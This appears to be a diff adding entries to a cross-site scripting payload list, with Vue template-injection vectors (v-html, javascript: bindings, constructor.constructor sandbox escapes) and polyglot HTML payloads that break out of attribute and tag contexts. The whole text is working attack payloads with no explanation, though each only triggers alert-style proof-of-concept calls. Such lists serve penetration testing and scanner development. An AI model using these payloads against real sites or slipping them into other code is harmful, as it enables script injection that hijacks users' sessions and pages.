+[VUE] v-bind:href="'javascript:alert(1)'"
+[VUE] {{ $emit.constructor('alert(1)')() }}
+[VUE] <a v-bind:href="javascript:alert(1)">click me</a>
+[VUE] <div v-on:click="alert(1)">click</div>
+[VUE] {{ this.constructor.constructor('alert(1)')() }}
+[VUE] <div v-html="'<script>alert(1)</script>'"></div>
+[VUE] <div v-html="'<svg onload=alert(1)>'"></div>
+[VUE] <div v-html="'<iframe src=javascript:alert(1)>'"></div>
+[VUE] <div v-html="'<object data=javascript:alert(1)>'"></div>
+[VUE] <div v-html="'<embed src=javascript:alert(1)>'"></div>
+[VUE] <div v-html="'<math><mi xlink:href=data:x/x,<script>alert(1)</script>></mi></math>'"></div>
+[VUE] <div v-html="'<video src=x onerror=alert(1)></video>'"></div>
+[VUE] <div v-html="'<audio src=x onerror=alert(1)></audio>'"></div>
+[VUE] <div v-html="'<details open ontoggle=alert(1)>'"></div>
+[VUE] <div v-html="'<marquee onstart=alert(1)>'"></div>
+[VUE] v-bind:action="'javascript:alert(1)'"
+[VUE] v-bind:data="'javascript:alert(1)'"
+[VUE] v-bind:src="'javascript:alert(1)'"
+[VUE] v-bind:formaction="'javascript:alert(1)'"
+[VUE] v-bind:xlink:href="'javascript:alert(1)'"
+[VUE] v-on:mouseover="alert(1)"
+[VUE] v-on:focus="alert(1)"
+[VUE] v-on:load="alert(1)"
+[VUE] v-on:error="alert(1)"
+[VUE] @click="alert(1)"
+[VUE] @mouseover="alert(1)"
+[VUE] @focus="alert(1)"
+[VUE] @load="alert(1)"
+[VUE] @error="alert(1)"
+[VUE] :href="'javascript:alert(1)'"
+[VUE] :action="'javascript:alert(1)'"
+[VUE] :data="'javascript:alert(1)'"
+[VUE] :src="'javascript:alert(1)'"
+[VUE] :formaction="'javascript:alert(1)'"
+[VUE] :xlink:href="'javascript:alert(1)'"
+[VUE] {{ $parent.constructor.constructor('alert(1)')() }}
+[VUE] {{ $root.constructor.constructor('alert(1)')() }}
+[VUE] {{ $options.constructor.constructor('alert(1)')() }}
+[VUE] {{ $data.constructor.constructor('alert(1)')() }}
+[VUE] {{ $props.constructor.constructor('alert(1)')() }}
+[VUE] {{ $el.constructor.constructor('alert(1)')() }}
+[VUE] {{ $refs.constructor.constructor('alert(1)')() }}
+[VUE] {{ $slots.constructor.constructor('alert(1)')() }}
+[VUE] {{ $scopedSlots.constructor.constructor('alert(1)')() }}
+[VUE] {{ $isServer.constructor.constructor('alert(1)')() }}
+[VUE] {{ $ssrContext.constructor.constructor('alert(1)')() }}
+[VUE] {{ $vnode.constructor.constructor('alert(1)')() }}
+[VUE] {{ $attrs.constructor.constructor('alert(1)')() }}
+[VUE] {{ $listeners.constructor.constructor('alert(1)')() }}
+[VUE] {{ $watch.constructor.constructor('alert(1)')() }}
+[VUE] {{ $set.constructor.constructor('alert(1)')() }}
+[VUE] {{ $delete.constructor.constructor('alert(1)')() }}
+[VUE] {{ $on.constructor.constructor('alert(1)')() }}
+[VUE] {{ $once.constructor.constructor('alert(1)')() }}
+[VUE] {{ $off.constructor.constructor('alert(1)')() }}
+[VUE] {{ $forceUpdate.constructor.constructor('alert(1)')() }}
+[VUE] {{ $nextTick.constructor.constructor('alert(1)')() }}
+[VUE] {{ $destroy.constructor.constructor('alert(1)')() }}
+[VUE] {{ $createElement.constructor.constructor('alert(1)')() }}
+[VUE] {{ ''.constructor.constructor('alert(1)')() }}
+[VUE] {{ (1).constructor.constructor('alert(1)')() }}
+[VUE] {{ ([]).constructor.constructor('alert(1)')() }}
+[VUE] {{ ({}).constructor.constructor('alert(1)')() }}
+[VUE] {{ (/x/).constructor.constructor('alert(1)')() }}
+[VUE] {{ (false).constructor.constructor('alert(1)')() }}
+[VUE] <div v-html="'<a href=javascript:alert(1)>X</a>'"></div>
+[VUE] <div v-html="'<form action=javascript:alert(1)><button>X</button></form>'"></div>
+[VUE] <div v-html="'<object data=javascript:alert(1)></object>'"></div>
+[VUE] <div v-html="'<embed src=javascript:alert(1)></embed>'"></div>
+[VUE] <div v-html="'<iframe src=javascript:alert(1)></iframe>'"></div>
+[VUE] v-bind:href="'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='"
+[VUE] :href="'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='"
+[VUE] v-bind:action="'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='"
+[VUE] :action="'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='"
+[VUE] v-bind:data="'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='"
+[VUE] :data="'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='"
+
+[POLYGLOT] '/*\'/*/*--><svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert(1)//'">
+[POLYGLOT] ">><marquee><img src=x onerror=confirm(1)></marquee>"</plaintext\></|\><plaintext/onmouseover=prompt(1)"><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"<!--</script><script>alert(1)</script>
+[POLYGLOT] javascript://%250Aalert(1)//"&apos;;alert(1)//%22;alert(1)//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert(1)%3C/SCRIPT%3E
+[POLYGLOT] "\x3e\x3cimg src=x onerror=alert(1)\x3e
+[POLYGLOT] %22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+[POLYGLOT] '"><script>alert(1)</script><"
+[POLYGLOT] "><img src=x onerror=alert(1);>
+[POLYGLOT] '"><img src=x onerror=alert(1)>
+[POLYGLOT] javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+[POLYGLOT] '";</script><script>alert(1)</script>
+[POLYGLOT] \";alert(1);//
+[POLYGLOT] <script>/*<![CDATA[*/alert(1)/*]]>*/</script>
+[POLYGLOT] " onclick=alert(1) a="
+[POLYGLOT] ' onclick=alert(1) a='
+[POLYGLOT] <a href="javascript:alert(1)">Click</a>
+[POLYGLOT] </title></style></textarea></script></xmp><svg/onload=alert(1)>
+[POLYGLOT] "><svg onload=alert(1)>
+[POLYGLOT] '><svg onload=alert(1)>
+[POLYGLOT] "><iframe src="javascript:alert(1)">
+[POLYGLOT] '><iframe src="javascript:alert(1)">
+[POLYGLOT] "><object data="javascript:alert(1)">
+[POLYGLOT] '><object data="javascript:alert(1)">
+[POLYGLOT] "><embed src="javascript:alert(1)">
+[POLYGLOT] '><embed src="javascript:alert(1)">
+[POLYGLOT] "><a href="javascript:alert(1)">Click</a>
+[POLYGLOT] '><a href="javascript:alert(1)">Click</a>
+[POLYGLOT] "><form action="javascript:alert(1)"><button>X</button></form>
+[POLYGLOT] '><form action="javascript:alert(1)"><button>X</button></form>
+[POLYGLOT] "><math><mi xlink:href="data:x/x,<script>alert(1)</script>"></mi></math>
+[POLYGLOT] '><math><mi xlink:href="data:x/x,<script>alert(1)</script>"></mi></math>
+[POLYGLOT] "><video src=x onerror=alert(1)></video>
+[POLYGLOT] '><video src=x onerror=alert(1)></video>
+[POLYGLOT] "><audio src=x onerror=alert(1)></audio>
+[POLYGLOT] '><audio src=x onerror=alert(1)></audio>
+[POLYGLOT] "><details open ontoggle=alert(1)>
+[POLYGLOT] '><details open ontoggle=alert(1)>
+[POLYGLOT] "><marquee onstart=alert(1)>
+[POLYGLOT] '><marquee onstart=alert(1)>
+[POLYGLOT] "><body onload=alert(1)>
+[POLYGLOT] '><body onload=alert(1)>
+[POLYGLOT] "><base href="javascript:alert(1)//">
+[POLYGLOT] '><base href="javascript:alert(1)//">
+[POLYGLOT] "><bgsound src="javascript:alert(1)">
+[POLYGLOT] '><bgsound src="javascript:alert(1)">
+[POLYGLOT] "><link rel="stylesheet" href="javascript:alert(1)">
+[POLYGLOT] '><link rel="stylesheet" href="javascript:alert(1)">
+[POLYGLOT] "><style>@import 'javascript:alert(1)';</style>
+[POLYGLOT] '><style>@import 'javascript:alert(1)';</style>
+[POLYGLOT] "><meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+[POLYGLOT] '><meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+[POLYGLOT] "><applet code="javascript:alert(1)"></applet>
+[POLYGLOT] '><applet code="javascript:alert(1)"></applet>
+[POLYGLOT] "><object type="text/x-scriptlet" data="javascript:alert(1)"></object>
+[POLYGLOT] '><object type="text/x-scriptlet" data="javascript:alert(1)"></object>
+[POLYGLOT] "><template><script>alert(1)</script></template>
+[POLYGLOT] '><template><script>alert(1)</script></template>
+[POLYGLOT] "><table background="javascript:alert(1)">
+[POLYGLOT] '><table background="javascript:alert(1)">
+[POLYGLOT] "><td background="javascript:alert(1)">
+[POLYGLOT] '><td background="javascript:alert(1)">
+[POLYGLOT] "><div style="background-image: url(javascript:alert(1))">
+[POLYGLOT] '><div style="background-image: url(javascript:alert(1))">
+[POLYGLOT] "><keygen autofocus onfocus=alert(1)>
+[POLYGLOT] '><keygen autofocus onfocus=alert(1)>
+[POLYGLOT] "><frameset><frame src="javascript:alert(1)"></frameset>
+[POLYGLOT] '><frameset><frame src="javascript:alert(1)"></frameset>
+[POLYGLOT] "><input type="image" src="x" onerror="alert(1)">
+[POLYGLOT] '><input type="image" src="x" onerror="alert(1)">
+[POLYGLOT] "><button formaction="javascript:alert(1)">X</button>
+[POLYGLOT] '><button formaction="javascript:alert(1)">X</button>
+[POLYGLOT] "><source src="javascript:alert(1)">
+[POLYGLOT] '><source src="javascript:alert(1)">
+[POLYGLOT] "><track default src="javascript:alert(1)">
+[POLYGLOT] '><track default src="javascript:alert(1)">
+[POLYGLOT] "><svg><script>alert(1)</script></svg>
+[POLYGLOT] '><svg><script>alert(1)</script></svg>
+[POLYGLOT] "><svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><rect width="100" height="100"/></a></svg>
+[POLYGLOT] '><svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><rect width="100" height="100"/></a></svg>
+[POLYGLOT] "><math><a xlink:href="javascript:alert(1)">Click</a></math>
+[POLYGLOT] '><math><a xlink:href="javascript:alert(1)">Click</a></math>
+[POLYGLOT] "><picture><source srcset="x" onerror="alert(1)"><img src="x"></picture>
+[POLYGLOT] '><picture><source srcset="x" onerror="alert(1)"><img src="x"></picture>
+[POLYGLOT] "><map><area href="javascript:alert(1)" shape="default"></map>
+[POLYGLOT] '><map><area href="javascript:alert(1)" shape="default"></map>
+[POLYGLOT] "><style>body{background:url("javascript:alert(1)")}</style>
+[POLYGLOT] '><style>body{background:url("javascript:alert(1)")}</style>
+[POLYGLOT] "><xmp><script>alert(1)</script></xmp>
+[POLYGLOT] '><xmp><script>alert(1)</script></xmp>
+[POLYGLOT] "><noscript><p title="</noscript><img src=x onerror=alert(1)>">
+[POLYGLOT] '><noscript><p title="</noscript><img src=x onerror=alert(1)>">
+[POLYGLOT] "><noembed><img src=x onerror=alert(1)></noembed>
+[POLYGLOT] '><noembed><img src=x onerror=alert(1)></noembed>
+[POLYGLOT] "><noframes><img src=x onerror=alert(1)></noframes>
+[POLYGLOT] '><noframes><img src=x onerror=alert(1)></noframes>
+[POLYGLOT] "><title></title><script>alert(1)</script>
+[POLYGLOT] '><title></title><script>alert(1)</script>
+[POLYGLOT] "><textarea></textarea><script>alert(1)</script>
+[POLYGLOT] '><textarea></textarea><script>alert(1)</script>
+[POLYGLOT] "><style></style><script>alert(1)</script>
+[POLYGLOT] '><style></style><script>alert(1)</script>
